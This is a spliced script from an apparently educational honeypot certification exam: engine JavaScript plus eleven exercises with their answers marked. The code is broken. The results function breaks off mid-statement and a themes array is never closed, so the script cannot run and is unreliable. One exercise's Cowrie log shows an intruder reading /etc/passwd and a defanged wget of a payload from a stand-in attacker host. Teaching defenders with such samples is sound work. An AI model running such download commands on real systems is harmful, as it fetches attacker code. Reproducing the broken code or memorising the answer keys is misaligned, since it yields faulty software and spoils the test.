<script>
'use strict';
/* CyberPulse Academy — self-contained exam engine, core (part A) */
var TOPIC_ID,BATCH,PASS_MARK,TIME_SECS,SEV_LABEL,EXS,INTRO,THEMES;
var S={order:[],idx:0,recs:{},skipped:[],phase:'intro',tLeft:0,timerId:null,paused:false,reported:false,uname:'',exTimerId:null};
function $(id){return document.getElementById(id);}
function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function txt(s){return String(s).replace(/<[^>]*>/g,'');}
function shuf(a){a=a.slice();for(var i=a.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1)),t=a[i];a[i]=a[j];a[j]=t;}return a;}
function div(cls){var d=document.createElement('div');if(cls)d.className=cls;return d;}
function fmtT(s){s=Math.max(0,s|0);var m=Math.floor(s/60),r=s%60;return (m<10?'0':'')+m+':'+(r<10?'0':'')+r;}
function ncmd(s){return String(s).replace(/\s+/g,' ').trim().replace(/\[\.\]/g,'.');}
function rec(i){if(!S.recs[i])S.recs[i]={status:'pending',earned:0,hint:false,detail:'',g:null};return S.recs[i];}
function earnedTotal(){var p=0,k;for(k in S.recs){if(S.recs[k].status==='answered')p+=S.recs[k].earned;}return p;}
function updHdr(){if(!S.order.length)return;$('h-count').textContent='Exercise '+(S.idx+1)+' of '+S.order.length;$('h-score').textContent=earnedTotal()+' pts';$('t-min').textContent=fmtT(S.tLeft);$('h-timer').classList.toggle('low',S.tLeft<=60);$('pbar').style.width=Math.round((S.idx+1)/S.order.length*100)+'%';}
function startTimer(){S.tLeft=TIME_SECS;if(S.timerId)clearInterval(S.timerId);S.timerId=setInterval(function(){if(S.paused)return;S.tLeft--;updHdr();if(S.tLeft<=0){clearInterval(S.timerId);timeUp();}},1000);}
function startExTimer(sec,onEnd){stopExTimer();var left=sec;S.exTimerId=setInterval(function(){if(S.paused)return;left--;var e=$('extimer');if(e)e.textContent=fmtT(left);if(left<=0){stopExTimer();onEnd();}},1000);}
function stopExTimer(){if(S.exTimerId){clearInterval(S.exTimerId);S.exTimerId=null;}}
function setPaused(p){if(S.phase!=='exam'&&S.phase!=='review')return;S.paused=p;$('pause-ov').classList.toggle('hidden',!p);}
function timeUp(){stopExTimer();S.paused=false;$('pause-ov').classList.add('hidden');showResults(true);}
function startExam(){S.order=shuf(EXS.map(function(e,i){return i;}));S.idx=0;S.recs={};S.skipped=[];S.reported=false;S.phase='exam';$('scr-intro').classList.add('hidden');$('scr-results').classList.add('hidden');$('scr-review').classList.add('hidden');$('scr-exam').classList.remove('hidden');$('hdr').classList.remove('hidden');startTimer();renderCurrent();}
function renderCurrent(){var ei=S.order[S.idx],ex=EXS[ei],r=rec(ei);$('btn-skip').disabled=(r.status==='answered'||r.status==='timedout');$('btn-hint').disabled=(r.status==='answered'||r.status==='timedout'||r.hint);updHdr();renderExercise(ex,ei);window.scrollTo(0,0);}
function nextStep(){if(S.idx<S.order.length-1){S.idx++;renderCurrent();}else{if(S.skipped.length>0){showReview();}else{finishExam();}}}
function skipCur(){var ei=S.order[S.idx],r=rec(ei);if(r.status==='answered'||r.status==='timedout')return;stopExTimer();r.status='skipped';if(S.skipped.indexOf(ei)<0)S.skipped.push(ei);nextStep();}
function hintCur(){var ei=S.order[S.idx],ex=EXS[ei],r=rec(ei);if(r.hint||r.status==='answered'||r.status==='timedout')return;r.hint=true;var hp=$('hintpanel');if(hp){hp.innerHTML='<b>Hint used — this exercise now earns 90% of its points:</b> '+ex.hint;hp.classList.remove('hidden');}$('btn-hint').disabled=true;}
function returnTo(ei){S.phase='exam';$('scr-review').classList.add('hidden');$('scr-exam').classList.remove('hidden');S.idx=S.order.indexOf(ei);renderCurrent();}
function showReview(){S.phase='review';$('scr-exam').classList.add('hidden');$('scr-results').classList.add('hidden');$('hdr').classList.remove('hidden');var rv=$('scr-review');rv.classList.remove('hidden');var h='<div class="introcard"><h1>Review skipped exercises</h1><p>You have skipped <b>'+S.skipped.length+'</b> exercise(s). You may return to any of them and answer it now. You can repeat this as often as you want, until the timer ends or you submit.</p><p>If you submit while an exercise is still unanswered, that exercise is <b>excluded from the score</b>: it does not count as right and does not count as wrong.</p><p>⏱ Time left: <b>'+fmtT(S.tLeft)+'</b></p><div id="skiplist"></div><div class="submitrow"><button class="btn" id="btn-finalsubmit" type="button">Submit exam now</button></div></div>';rv.innerHTML=h;var l=$('skiplist');S.skipped.slice().sort(function(a,b){return S.order.indexOf(a)-S.order.indexOf(b);}).forEach(function(ei){var ex=EXS[ei],d=div('repitem');d.innerHTML='<b>'+esc(ex.title)+'</b> &nbsp;<span class="rs skip">⚠ Skipped — not answered</span><div class="submitrow"><button class="btn sec" type="button">Return to this exercise</button></div>';d.querySelector('button').addEventListener('click',function(){returnTo(ei);});l.appendChild(d);});$('btn-finalsubmit').addEventListener('click',finishExam);window.scrollTo(0,0);}
function finishExam(){stopExTimer();showResults(false);}
function showResults(timedOut){S.phase='results';stopExTimer();$('hdr').classList.add('hidden');$('scr-exam').classList.add('hidden');$('scr-review').classList.add('hidden');var rs=$('scr-results');rs.classList.remove('hidden');
var answered=0,earned=0,full=0,part=0,wrong=0,excl=0;
EXS.forEach(function(ex,i){var r=S.recs[i];if(r&&r.status==='answered'){answered++;earned+=r.earned;if(r.earned>=100){full++;}else if(r.earned>0){part++;}else{wrong++;}}else{excl++;}});
var total=answered,pct=total>0?Math.round(earned/total):0,sc=total>0?Math.round(earned/10)/10:0,passed=(total>0&&pct>=PASS_MARK);
var stats='<div class="statgrid">'
+'<div class="stat"><div class="n">'+full+'</div><div class="lbl">✓ Fully correct</div></div>'
+'<div class="stat"><div class="n">'+part+'</div><div class="lbl">~ Partial credit</div></div>'
+'<div class="stat"><div class="n">'+wrong+'</div><div class="lbl">✗ Incorrect</div></div>'
+'<div class="stat"><div class="n">'+excl+'</div><div class="lbl">⚠ Not answered — excluded</div></div>'
+'</div>';
var hero='<div class="result-hero">'+(passed?'<div class="big" style="color:var(--green)">PASS</div>':'<div class="big" style="color:var(--red)">FAIL</div>')
+'<div class="passline">'+(passed?'Congratulations — you passed the '+SEV_LABEL+' certification exam.':'You did not reach the pass mark of '+PASS_MARK+'%. You must retake this exam.')+'</div>'
+'<div style="font-size:34px;font-weight:900;margin-top:10px">'+pct+'%</div>'
+'<div style="color:var(--dim)">'+sc+' fully-correct equivalent(s) of '+total+' answered — percentage is computed only over what you answered</div>'
+(timedOut?'<p style="color:var(--amber);margin-top:10px">⏱ Time ran out. Exercises you never answered were excluded from the score.</p>':'')

INTRO={
kw:"Honeypot",
h1:"Honeypot — MEDIUM certification exam",
paras:[
"<b>Building on the basics.</b> You already know that a honeypot is a fake target with no real users. At MEDIUM level you go one step further: you combine two ideas at a time. You will decide <i>which</i> decoy fits a goal, <i>where</i> to place it, and <i>what to do</i> when it fires. Picture yourself on shift: four alerts blink at once, and the honeypot alert deserves your attention first — but you must be able to say <b>why</b>.",
"<b>The two halves of every honeypot.</b> A real deployment has a capture side and a control side. <b>Data capture</b> records everything the attacker does: packets, keystrokes, downloaded files. <b>Data control</b> limits what the attacker can send out of the decoy, so your honeypot can never be used to attack other people. Add <b>data collection</b> — centralising logs from many decoys into your SIEM — and you have the classic honeynet architecture. You will meet all three in these exercises.",
"<b>Deception beyond machines.</b> Decoys are not only servers. A <b>honeytoken</b> is a fake item that looks valuable — a cloud API key, a patient record, a spreadsheet named 'Salaries' — whose only job is to fire an alert when someone touches it. Honeytokens catch insiders and credential thieves that network honeypots never see. You will place honeytokens, read a live SSH session on a Cowrie decoy, and answer the legal question every team must face: the difference between <b>enticement</b> (offering a target) and <b>entrapment</b> (pushing someone into a crime).",
"<b>Two steps, every time.</b> Each exercise here needs two connected decisions: first work out what actually matters in the scenario, then choose the action that follows from it. The scenarios are realistic — SOC queues, config reviews, red-team workshops — but the language stays plain. Take your time; the timer is generous for this tier."
],
facts:["Pass mark: 70%","11 exercises","30 minutes total","Each exercise is worth 100 points","1 hint per exercise (−10% on that exercise)","Skip is free — unanswered skips are excluded from the score","Pause hides the current exercise"],
rules:[
"<b>Severity: MEDIUM.</b> Every exercise combines exactly two connected ideas. Scenarios are 4–9 sentences or one artefact plus context. You must decide what to look at first.",
"<b>Exercise types:</b> SOC alert-queue triage, multiple choice, honeytoken placement, a two-step branching incident, concept matching, config mistake hunting, report drafting, one terminal exercise (grep, tool named, intent given), and urgency ranking.",
"<b>Scoring:</b> each exercise is worth 100 points; matching, ranking and fill-in exercises give partial credit. The final percentage counts only the exercises you answered.",
"<b>Hints:</b> one per exercise, −10% of that exercise's points. The hint narrows the direction, it does not give the answer.",
"<b>Skipping:</b> use Skip on any exercise; it moves to a review pool without revealing the answer. Return to skipped exercises as often as you want before finishing. Anything still unanswered at submit time is excluded from the score.",

"<b>Passing:</b> 70% or more over answered exercises. Retakes reshuffle everything."
]};
THEMES=[

{n:"SOC and detection",items:["High-fidelity alerts, low false positives","Alert triage and queueing","SIEM integration and correlation","Threat hunting with decoy data","Attacker fingerprinting of decoys","Attribution pitfalls"]},

EXS=[
{id:"m1",title:"Triage the morning queue",type:"sim",summary:"SOC queue, Monday 08:02 — four alerts, pick the one to work first",
scenario:{text:"You are alone on the Monday morning shift. Four alerts are waiting. Work them in the right order — starting with the one you open first.",artefacts:[{label:"Alert queue — 08:02",html:"<table class='qtable'><tr><th>ID</th><th>Source</th><th>Alert</th><th>Note</th></tr><tr><td>A-101</td><td>Mail gateway</td><td>Phishing mail opened by 1 user, link not clicked</td><td>same campaign seen last month</td></tr><tr><td>A-102</td><td>VPN gateway</td><td>41 failed logins for user j.moore, one country</td><td>user is on holiday</td></tr><tr><td>A-103</td><td>Honeypot FIN-DECOY-02</td><td>SMB login attempt from internal 10[.]20[.]4[.]51</td><td>decoy has no real users</td></tr><tr><td>A-104</td><td>Web server</td><td>Port scan against ports 80/443 from a Tor exit</td><td>common internet noise</td></tr></table>"}]},
question:"Which alert do you work first?",
hint:"One of these signals almost never fires without a real reason.",
answer:{opts:[{t:"A-101 — the phishing mail"},{t:"A-102 — the VPN brute force"},{t:"A-103 — the honeypot touch",c:true},{t:"A-104 — the web port scan"}]},
feedback:{why:"A honeypot has no real users, so a login attempt against it is a high-fidelity signal — it rarely means anything except reconnaissance or an intrusion in progress. The other three are common and often benign: a phishing mail without a click, a brute force against one account, routine internet scanning. Honeypot alerts normally jump the queue; work back through the others afterwards.",study:"Alert fidelity: what makes a signal worth immediate attention."}},
{id:"m2",title:"Choose the right build",type:"qcm",
scenario:{text:"Your team must capture the full behaviour of attackers who break into fake SSH servers: every command they type and every file they change. The team accepts more maintenance work and stronger isolation controls in exchange."},
question:"Which setup fits this goal best?",
hint:"Full behaviour means a real system, not scripted replies.",
answer:{opts:[{t:"A low-interaction honeypot with emulated SSH replies"},{t:"A firewall rule that logs port 22 traffic"},{t:"A high-interaction honeypot on an isolated virtual machine",c:true},{t:"An antivirus scan of the SSH server"}]},
feedback:{why:"Only a high-interaction honeypot gives attackers a real operating system, so every command and every change is captured in full — that is what the goal demands. A low-interaction decoy answers with scripts: cheaper and safer, but it cannot show real malware behaviour. A firewall rule or an antivirus scan records far less than the goal requires.",study:"Match the interaction level to the evidence you need."}},
{id:"m3",title:"Plant the honeytokens",type:"match",
scenario:{text:"Your deception lead hands you four honeytokens. A honeytoken is a fake item that looks valuable but is only a tripwire: if anyone touches it, an alert fires. Place each one where it works best."},
question:"Put each honeytoken in the location where it catches the right person.",
hint:"Ask: who would touch each item, and from where?",
answer:{zones:[{id:"repo",label:"Public code repository"},{id:"db",label:"Customer database"},{id:"share",label:"Shared file storage"},{id:"login",label:"A decoy login page"}],
items:[{id:"h1",t:"Fake cloud API key (looks real, alerts when used)",zone:"repo"},{id:"h2",t:"Fake patient record with a canary marker",zone:"db"},{id:"h3",t:"Fake file named Salary_Preview_2026.xlsx",zone:"share"},{id:"h4",t:"Fake admin password nobody in IT knows",zone:"login"}]},
feedback:{why:"An API key belongs in a repository — it fires when someone leaks or steals code. The fake record sits in the real database and catches anyone browsing patient data. The salary file tempts nosy insiders on the shared drive. The fake password only makes sense on a decoy login page, where typing it is a clear alarm. Honeytokens work because each one sits exactly where a specific bad behaviour happens.",study:"Honeytoken placement follows the behaviour you want to catch."}},
{id:"m4",title:"Follow the SSH session",type:"branch",
scenario:null,
question:null,
hint:"Step one: name the phase. Step two: remember what a honeypot is for.",
steps:[
{scenario:{text:"Cowrie recorded session 3ab1 overnight.",artefacts:[{label:"Cowrie log — session 3ab1",lines:["02:14:03 session=3ab1 New connection from 203[.]0[.]113[.]88:51022","02:14:09 session=3ab1 login attempt root / password1 — FAILED","02:14:15 session=3ab1 login attempt admin / admin — FAILED","02:14:40 session=3ab1 login success admin / Qw!9zX","02:15:02 session=3ab1 command: uname -a","02:15:20 session=3ab1 command: cat /etc/passwd"]}]},
question:"Step 1 of 2 — look at the session so far. What is the attacker doing?",
type:"qcm",
answer:{opts:[{t:"Only scanning ports from outside"},{t:"Running discovery commands after a successful login",c:true},{t:"Installing security updates"},{t:"Backing up the honeypot"}]},
feedback:{why:"The log shows failed logins, then a success, then commands that read system information (uname -a) and the user list (cat /etc/passwd). That is discovery inside a compromised shell — not an outside scan, and certainly not maintenance.",study:"Discovery after login: commands like uname and cat /etc/passwd name the phase for you."}},
{scenario:{text:"The same session, two minutes later:",artefacts:[{label:"Cowrie log — session 3ab1 (continued)",lines:["02:17:44 session=3ab1 command: wget hxxp://evil[.]example/pay/x1","02:17:59 session=3ab1 file download finished (sha256 9f2c…e1)","02:18:03 session=3ab1 command: chmod +x x1"]}]},
question:"Step 2 of 2 — what is the best next action for the honeypot team?",
type:"qcm",
answer:{opts:[{t:"Delete the downloaded file from the honeypot"},{t:"Reply to the attacker in the shell"},{t:"Preserve the captured files and session, and alert the IR team",c:true},{t:"Post the file hashes on social media"}]},
feedback:{why:"The honeypot's job is to capture and preserve. A downloaded payload is evidence: keep the session records, hash the file, and bring in the incident response team. Deleting the file destroys evidence, talking to the attacker creates risk, and posting hashes publicly can burn your observation window.",study:"The honeypot's product is evidence: preserve it, hash it, escalate it."}}],
feedback:{why:"Reading a decoy session has two moves: name what the attacker is doing right now (discovery after a successful login), then act to preserve evidence and escalate. The decoy exists precisely so this happens away from production systems.",study:"Phases of an intrusion, and the preserve-then-escalate rule."}},
{id:"m5",title:"Match the honeypot concepts",type:"match",
scenario:{text:"A junior asks you to explain four terms from the team wiki. Match each term to its plain-language meaning."},
question:"Place each description under the right term.",
hint:"Two of these are what the honeypot does; two are about the attacker and the law.",
answer:{zones:[{id:"dc",label:"Data control"},{id:"dcp",label:"Data capture"},{id:"ent",label:"Enticement"},{id:"fp",label:"Fingerprinting"}],
items:[{id:"c1",t:"Limits what an attacker can send out of the honeypot",zone:"dc"},{id:"c2",t:"Records everything the attacker does",zone:"dcp"},{id:"c3",t:"Making the decoy attractive, within the law",zone:"ent"},{id:"c4",t:"Attacker tests whether a system is fake",zone:"fp"}]},
feedback:{why:"Data control contains the risk — the decoy cannot be used to attack others. Data capture is the recording side: packets, keystrokes, files. Enticement is the legal way to make a decoy attractive, without pushing anyone into crime. Fingerprinting is the attacker's side: probing for signs that the system is fake.",study:"The classic trio — control, capture, collection — plus the two words that describe attacker and lawyer behaviour."}},
{id:"m6",title:"The entrapment question",type:"qcm",
scenario:{text:"Legal reviews your new honeypot. Its banner advertises a fake finance database full of tempting (but fake) numbers. A lawyer asks: 'Is this entrapment?'"},
question:"What is the key point the team should explain?",
hint:"There is a difference between offering a target and persuading someone to attack it.",
answer:{opts:[{t:"Any decoy that looks attractive is always entrapment"},{t:"Entrapment applies only when the decoy is run by a government agency"},{t:"It is only entrapment if the attacker succeeds; failed attempts are legal"},{t:"Entrapment means pushing a person into a crime; a passive decoy is usually called enticement",c:true}]},
feedback:{why:"Entrapment means inducing someone to commit a crime they would not otherwise commit. A honeypot that simply sits there and looks attractive is normally described as enticement — offering a target without pushing anybody. Companies still need legal review and clear rules of engagement, but 'attractive decoy equals entrapment' is the common mistake this question fixes.",study:"Enticement versus entrapment — a GRC staple."}},
{id:"m7",title:"Find the config mistake",type:"spot",
scenario:{text:"A partner left this honeypot configuration behind. One line creates a serious risk. Click that line."},
question:"Click the configuration line that creates the biggest risk.",
hint:"Think about what the honeypot could do to other people if the attacker controls it.",
answer:{pick:1,correct:[3],lines:["[honeypot]  ssh_banner=\"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4\"","log_file=/var/log/cowrie/cowrie.log","forward_alerts_to=siem-core-01:514","outbound_policy=unlimited","hide_process_names=true"]},
feedback:{why:"outbound_policy=unlimited means an attacker who controls the honeypot can freely attack other systems from it — your organisation could be liable for those attacks, and the decoy becomes a weapon. A safe configuration limits outbound traffic (data control) to exactly what the capture work needs.",study:"Data control — the containment half of every honeypot design."}},
{id:"m8",title:"Complete the report",type:"fill",
scenario:{text:"You must finish the shift report before handover. Fill the blanks with the right terms."},
question:"Pick the right term for each blank.",
hint:"Many wrong logins followed by one success has a well-known name. The platform that collects and links events is the SIEM.",
answer:{template:"Between 01:40 and 02:25 UTC, honeypot cowrie-02 recorded 12 {{0}} SSH logins followed by one successful login from 203[.]0[.]113[.]50. The pattern fits a {{1}} attack. All events were forwarded to the {{2}} for correlation, and ticket IR-2231 was opened.",
bank:["failed","brute-force","SIEM","birthday","printer"],correct:[0,1,2]},
feedback:{why:"Many wrong logins followed by a success is the classic shape of a brute-force attack. The SIEM (Security Information and Event Management system) is where logs are collected and correlated across sources — forwarding decoy logs there is standard practice. 'Birthday' names a different attack class entirely, and 'printer' fits nothing here.",study:"Brute-force patterns in decoy logs; why honeypots feed the SIEM."}},
{id:"m9",title:"Filter the failed logins",type:"term",
scenario:{text:"You continue working on cowrie-02. The log at /var/log/cowrie/cowrie.log mixes many event types. For ticket IR-2231 you only need the failed login lines. Intent hint: you want to see only the lines that contain FAILED — nothing else.",artefacts:[{label:"What the tool does (plain words only)",lines:["The grep tool prints every line of a file that contains a word or phrase you give it.","It does not change the file. It only shows the lines that match."]}]},
question:"Type the command that prints only the lines containing FAILED from /var/log/cowrie/cowrie.log.",
hint:"One tool prints lines that match a pattern. Watch the letter case: the log writes FAILED in capitals.",
term:{prompt:"analyst@cowrie-02:~$",banner:["cowrie-02 — Ubuntu 22.04 — analyst shell","Log: /var/log/cowrie/cowrie.log (mixed event types)"],
check:function(cmd){var p=cmd.split(" ");if(p[0].toLowerCase()!=="grep")return {kind:"unknown",out:[p[0]+": command not found"]};
var ci=false,pat=null,path=null,i;
for(i=1;i<p.length;i++){var a=p[i];
if(a==="-i"){ci=true;}
else if(a.charAt(0)==="-"&&a.length>1){return {kind:"wrong",out:["grep: invalid option — "+a],note:"No other options are needed for this job."};}
else if(pat===null){pat=a.replace(/^\"(.*)\"$/,"$1").replace(/^'(.*)'$/,"$1");}
else if(path===null){path=a;}
else return {kind:"wrong",out:["grep: extra argument — "+a],note:"One pattern and one file are enough here."};}
if(!pat||!path)return {kind:"wrong",out:["usage: grep PATTERN FILE"],note:"The command needs both the pattern and the log path."};
if(path!=="/var/log/cowrie/cowrie.log")return {kind:"wrong",out:["grep: "+path+": No such file or directory"],note:"Use the exact log path from the ticket."};
if(pat!=="FAILED"&&!(ci&&pat.toUpperCase()==="FAILED"))return {kind:"wrong",out:["(no output — grep found nothing)"],note:"The log writes the word in capitals. Without -i, grep failed matches nothing, because grep is case-sensitive by default."};
return {kind:"ok",out:["Mar 11 01:40:11 cowrie-02 cowrie: login attempt root/password1 — FAILED","Mar 11 01:41:02 cowrie-02 cowrie: login attempt admin/123456 — FAILED","Mar 11 02:02:47 cowrie-02 cowrie: login attempt root/abc123 — FAILED","… (9 more FAILED lines)"]};},
canonical:"grep FAILED /var/log/cowrie/cowrie.log",
parts:["<b>grep</b> — prints every line that matches a pattern.","<b>FAILED</b> — the pattern. The log spells it in capitals, so this matches; <b>grep failed</b> alone would match nothing. Adding <b>-i</b> makes the match case-insensitive, so <b>grep -i failed</b> is also correct here.","<b>/var/log/cowrie/cowrie.log</b> — the file to search."]},
feedback:{why:"grep is the workhorse for pulling matching lines out of a log. The pattern FAILED must match the letter case used in the file — or you add -i to ignore case. Everything else in the log (successful logins, connections, commands) stays hidden, which is exactly what the ticket needs.",study:"grep, case sensitivity, and the -i flag."}},
{id:"m10",title:"Think like the red team",type:"qcm",
scenario:{text:"You are the red team in a workshop. You land on a server that may be a decoy. Every command — even nonsense syntax — returns a perfect, instant reply. Real systems show small delays, odd errors and imperfect output."},
question:"What does this behaviour suggest, and what should you do next?",
hint:"Perfect answers to imperfect input are a tell.",
answer:{opts:[{t:"It is certainly a real server; escalate privileges at once"},{t:"It may be an emulated honeypot; probe slowly with rare commands before trusting it",c:true},{t:"It is certainly a broken server; disconnect and move on"},{t:"Reply speed never reveals anything; ignore it"}]},
feedback:{why:"Scripted honeypots often answer too perfectly and too quickly — even to invalid input that a real shell would reject with a specific error. That is a classic fingerprint. A careful attacker stays slow and uses unusual commands to test consistency before trusting the target. Certainty in either direction is premature without more probes.",study:"How attackers fingerprint decoys — and why honeypot emulation must include realistic errors."}},
{id:"m11",title:"Rank the alerts",type:"order",
scenario:{text:"Four honeypot-related events landed during your shift. Rank them from most urgent (top) to least urgent (bottom)."},
question:"Order the four events: most urgent first.",
hint:"Ask for each: can it still hurt us right now, and does it show a real person inside?",
answer:{items:["Outbound connection attempt from the honeypot to an unknown server","A complete SSH login session on the honeypot","Twelve failed SSH logins on the honeypot","A known internet scanner touched the honeypot banner"],
correct:[0,1,2,3]},
feedback:{why:"An outbound connection from the honeypot is the most dangerous event in the list: it may mean the attacker escaped the decoy — a data control failure — and can now harm others, including legally. A full login session shows an intruder inside the decoy: serious, but contained. Failed logins show intent without access. A known scanner touching the banner is background noise that is already understood.",study:"Ranking decoy events: containment risk first, proof of intrusion second, intent third, known noise last."}}
];
